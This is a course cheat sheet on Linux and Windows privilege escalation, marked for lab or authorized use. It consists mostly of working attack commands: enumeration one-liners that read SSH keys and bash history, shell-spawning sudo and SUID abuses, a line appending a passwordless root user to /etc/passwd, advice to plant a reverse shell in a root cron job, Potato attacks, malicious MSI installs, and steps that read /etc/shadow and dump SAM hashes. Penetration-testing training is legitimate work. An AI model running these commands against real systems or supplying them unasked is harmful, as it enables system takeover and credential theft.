# Privilege Escalation

From a foothold to root/SYSTEM. Pairs with [Module 06](../modules/06-system-hacking/) and [Kali ch.14](../kali/14-post-exploitation-pivoting.md). **Lab / authorized only.**

## Linux — enumerate first
```bash
id ; sudo -l ; uname -a ; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
find / -perm -2000 -type f 2>/dev/null          # SGID
getcap -r / 2>/dev/null                          # file capabilities
crontab -l ; cat /etc/crontab ; ls -la /etc/cron.*   # writable/root cron jobs
find / -writable -type d 2>/dev/null | grep -v proc  # writable dirs
cat ~/.bash_history /home/*/.ssh/id_* 2>/dev/null    # creds/keys
# automated:
./linpeas.sh            # PEASS-ng (serve from Kali: python3 -m http.server 80)
```

### Linux privesc paths
| Finding | Exploit |
|---|---|
| `sudo -l` shows a command | Abuse it (see GTFOBins) — e.g. `sudo find . -exec /bin/sh \;` |
| SUID binary | Run it to spawn a shell (GTFOBins), e.g. `nmap --interactive` → `!sh` |
| Writable `/etc/passwd` | Add a root user: `echo 'r::0:0::/root:/bin/bash' >> /etc/passwd` |
| Writable cron script run by root | Put a reverse shell in it |
| `CAP_SETUID` capability | `./binary` → drop to uid 0 |
| Kernel version vulnerable | `searchsploit linux kernel <ver>` (DirtyPipe/DirtyCow/PwnKit) |
| PwnKit (polkit) CVE-2021-4034 | Run the public PoC |

> **GTFOBins is the key reference** for SUID/sudo/cap abuse: https://gtfobins.github.io/

## Windows — enumerate first
```powershell
whoami /priv                     # token privileges (look for SeImpersonate/SeBackup/SeDebug)
whoami /groups
systeminfo                       # OS/patch level -> Windows Exploit Suggester
net user ; net localgroup administrators
.\winPEAS.exe                    # PEASS-ng
```
Meterpreter: `getsystem`, `run post/multi/recon/local_exploit_suggester`, `load kiwi`.

### Windows privesc paths
| Finding | Exploit |
|---|---|
| `SeImpersonatePrivilege` | **Potato** attacks (JuicyPotato / PrintSpoofer / GodPotato) → SYSTEM |
| `SeBackupPrivilege` | Read SAM/SYSTEM hives, dump hashes |
| Unquoted service path (with spaces) | Plant a binary in the path gap |
| Weak service permissions | `sc config <svc> binPath=...` → restart |
| `AlwaysInstallElevated` = 1 | Install a malicious MSI as SYSTEM |
| Stored creds | `cmdkey /list`, registry `winlogon`, unattend.xml, SAM |
| Missing patch | Windows-Exploit-Suggester / metasploit suggester |

## After you escalate
```bash
# Linux: loot
cat /etc/shadow ; cat /root/root.txt
# Windows: dump hashes
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system   # then impacket-secretsdump -sam sam -system system LOCAL
```

> Deep: HackTricks Linux/Windows local privesc — https://book.hacktricks.xyz/ · PEASS-ng — https://github.com/peass-ng/PEASS-ng · GTFOBins — https://gtfobins.github.io/ · LOLBAS — https://lolbas-project.github.io/
